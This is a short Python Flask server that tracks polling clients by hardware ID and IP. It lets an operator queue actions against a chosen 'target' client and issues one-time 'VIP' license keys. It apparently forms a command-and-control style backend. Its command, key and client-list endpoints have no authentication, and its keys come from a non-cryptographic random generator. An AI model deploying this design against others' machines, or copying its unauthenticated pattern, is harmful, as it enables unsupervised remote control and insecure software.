import time
import random
import string
from flask import Flask, request, jsonify, render_template

app = Flask(__name__)

clients = {}
generated_keys = set()


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/api/heartbeat", methods=["POST"])
def heartbeat():
    data = request.get_json(silent=True) or {}

    hwid = data.get("hwid")
    ip = data.get("ip")
    username = data.get("username", "Client_Alpha")

    if hwid:
        current_action = clients.get(hwid, {}).get("pending_action", "")

        clients[hwid] = {
            "hwid": hwid,
            "ip": ip,
            "username": username,
            "last_seen": time.time(),
            "pending_action": ""
        }

        return jsonify({"action": current_action}), 200

    return jsonify({"action": ""}), 200


@app.route("/api/clients", methods=["GET"])
def get_clients():
    now = time.time()

    offline_nodes = [
        hwid
        for hwid, info in clients.items()
        if now - info["last_seen"] > 35
    ]

    for hwid in offline_nodes:
        del clients[hwid]

    return jsonify(clients)


@app.route("/api/target-action", methods=["POST"])
def target_action():
    data = request.get_json(silent=True) or {}

    hwid = data.get("hwid")
    action = data.get("action", "")

    if hwid in clients:
        clients[hwid]["pending_action"] = action
        return jsonify({
            "message": f"Command {action} queued successfully."
        }), 200

    return jsonify({
        "message": "Client offline or not found."
    }), 404


@app.route("/api/clear-target", methods=["POST"])
def clear_target():
    data = request.get_json(silent=True) or {}

    hwid = data.get("hwid")

    if hwid in clients:
        del clients[hwid]

    return "", 200


@app.route("/api/generate-key", methods=["POST"])
def generate_key():
    key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    formatted_key = f"VIP-{key[:4]}-{key[4:8]}-{key[8:]}"
    generated_keys.add(formatted_key)
    return jsonify({"key": formatted_key})


@app.route("/api/verify-key", methods=["POST"])
def verify_key():
    data = request.get_json(silent=True) or {}
    key = data.get("key")
    if key in generated_keys:
        generated_keys.remove(key)  # Burahin pagkatapos magamit para isang beses lang
        return jsonify({"success": True}), 200
    return jsonify({"success": False, "message": "Invalid or expired key"}), 400


if __name__ == "__main__":
    app.run(
        host="0.0.0.0",
        port=5000
    )
